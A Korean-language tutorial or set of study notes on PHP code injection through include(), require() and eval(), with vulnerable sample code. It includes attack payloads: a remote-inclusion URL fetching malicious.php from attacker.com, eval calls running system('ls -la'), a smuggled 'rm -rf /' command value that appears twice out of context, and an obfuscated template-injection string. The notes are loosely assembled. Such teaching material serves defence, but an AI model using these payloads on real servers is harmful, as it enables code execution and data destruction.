## **코드 인젝션 (Code Injection) 취약점**

**코드 인젝션(Code Injection)** 취약점은 공격자가 악성 코드를 서버의 실행 과정에 삽입하여 실행하도록 만드는 공격입니다. PHP에서는 **`include()`, `include_once()`, `require()`, `require_once()`, `eval()`** 함수들을 자주 사용하게 되는데, 이 함수들이 제대로 검증되지 않은 외부 입력을 처리할 경우 공격자가 악성 코드를 삽입하고 실행시킬 수 있습니다.

#### **1. include(), require() 함수 취약점**

`include()`나 `require()`는 외부 PHP 파일을 포함시킬 때 사용되는 함수입니다. 이 함수들은 웹 입력을 통해 동적으로 포함되는 파일 경로를 받아 처리하는데, 사용자가 입력한 데이터를 검증 없이 파일 경로로 사용하면 **파일 포함 공격**(File Inclusion Attack)에 취약해질 수 있습니다.

예시:

```php
<?php
  $file = $_GET['id'];  // 사용자 입력
  include($file . ".php");  // 외부 파일 포함
?>
```

위 코드에서 `$_GET['id']` 값을 통해 사용자가 파일 경로를 입력하면, 해당 파일이 포함되어 실행됩니다. 문제는 **경로 탐색 공격**이나 **악성 파일 포함**이 가능해진다는 것입니다.

#### **취약점 설명**

* **상위 디렉터리 탐색 공격**: `../`를 이용하여 다른 디렉터리로 이동할 수 있습니다. 이를 통해 서버의 민감한 파일을 포함시킬 수 있습니다.
* **원격 파일 포함 (RFI)**: 만약 서버에서 `allow_url_include` 설정이 켜져 있으면, 공격자는 원격 서버에 있는 악성 PHP 파일을 포함시킬 수 있습니다.
<br>
#### **2. eval() 함수 취약점**

`eval()` 함수는 PHP 코드를 **문자열로** 실행하는 함수입니다. 이 함수에 사용자 입력이 들어가면 공격자가 **PHP 코드를 실행**시킬 수 있습니다.

예시:

```php
<?php
  $code = $_GET['code'];  // 사용자 입력
  eval($code);  // 사용자 입력을 PHP 코드로 실행
?>
```

#### **취약점 설명**

* 공격자가 **자기 자신의 PHP 코드를** 입력하여 서버에서 실행시킬 수 있습니다. 예를 들어, 서버에서 임의의 명령어를 실행하거나 시스템을 제어하는 악성 코드를 넣을 수 있습니다.
* 이 경우, 사용자가 제공한 **코드가 그대로 실행되기 때문에** 이를 검증하지 않으면, 원격에서 악성 PHP 코드를 실행시킬 수 있습니다.

---

### **공격 페이로드 예시**

#### 1. 파일 포함 취약점 공격 (LFI 또는 RFI)

##### **RFI (Remote File Inclusion)** 공격

`allow_url_include`가 활성화되어 있으면, 원격 서버에서 파일을 포함시킬 수 있습니다.
* allow_url_include=1 : PHP 설정이 활성화되면 원격 URL의 include/require가 허용

**URL 예시**:

```
http://example.com/vulnerable.php?id=http://attacker.com/malicious.php
```

위의 URL은 `attacker.com`에 위치한 악성 PHP 파일을 포함시키려는 공격입니다. 이 파일은 서버에서 실행되어 **악성 코드**를 삽입할 수 있습니다.
<br>

#### 2. eval() 함수 취약점 공격

**PHP 코드 실행**을 위해 `eval()` 함수가 사용될 때, 공격자는 악성 PHP 코드를 입력하여 서버에서 실행시킬 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?code=phpinfo();
```

위의 URL은 `phpinfo()` 함수를 실행하여 서버의 **환경 정보**를 출력하는 PHP 코드를 실행시키는 공격입니다. 이 정보를 통해 공격자는 서버에 대한 중요한 정보를 얻을 수 있습니다.
<br>

#### 3. 악성 코드 삽입

`eval()` 함수에 악성 PHP 코드를 삽입할 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?code=system('ls -la'); // 서버 명령어 실행
```

이 코드는 `system('ls -la')` 명령을 실행하여 서버의 파일 목록을 출력합니다. 이처럼 `eval()`을 악용하면 **서버 명령어 실행**을 통해 공격자가 서버를 제어할 수 있습니다.

```
GET /api.php?file=example.txt;rm%20-rf%20/
```
<br>

#### 4. 요청의 바디(POST body)를 PHP 인터프리터가 자동으로 포함

auto_prepend_file=php://input 은 요청의 바디 전체를 PHP가 파일처럼 포함(include)하게 하는 설정이야. 만약 서버가 이 값을 허용하고 있고 POST 바디에 PHP 코드가 들어있다면(그리고 서버가 이를 실행하도록 되어 있다면) 포함된 코드가 실행될 수 있어.

**URL 예시**:

```
<?php ... ?>
     echo($Hello); 
<?php ... ?>
```

POST body에 <?php ... ?>가 포함되어 실행될 수 있다.

```
GET /api.php?file=example.txt;rm%20-rf%20/
```
<br>
---
* 코드(Code) 인젝션서버의 PHP 코드 실행 과정에 공격자의 코드를 삽입시키는 위협으로 가장 많은 공격은 서버에서 수행 코드를 내포시키는 include(), include_once(), require(), require_once() 함수들을 대상으로 해서 자신의 코드가 실행 과정에 반영되도록 하는 것입니다.
* include ($_GET['id'].".php");위의 사례처럼 웹 입력 자료를 기반으로 이들 함수를 사용한다면 철저한 사전 검사를 해야 합니다.
* 또다른 코드 인젝션의 위험성은 eval() 함수 사용입니다. eval() 함수로 PHP 코드를 문자열로 전달하면 그대로 수행하기 때문에 eval() 함수 파라미터가 혹여라도 웹 입력과 연관성이 있다면 철저한 사전 검사를 반드시 수행해야 합니다.

① query: s=captcha
입력값 검증이 없고, 사용자가 s 파라미터에 임의의 값을 넣을 수 있다면 LFI 등이 발생할 수 있다.
<br>
② tag/index=&tag=%7Bpbohome/Indexot:if(1)(usort/*%3e*/(post/*%3e*/(/*%3e*/1),create_function/*%3e*/(/*%3e*/post/*%3e*/(/*%3e*/2),post/*%3e*/(/*%3e*/3))));//)%7D(123)%7B/pbhome/Indexoot:if%7D&tagstpl=news.html&lnoc2tspfar1_ue



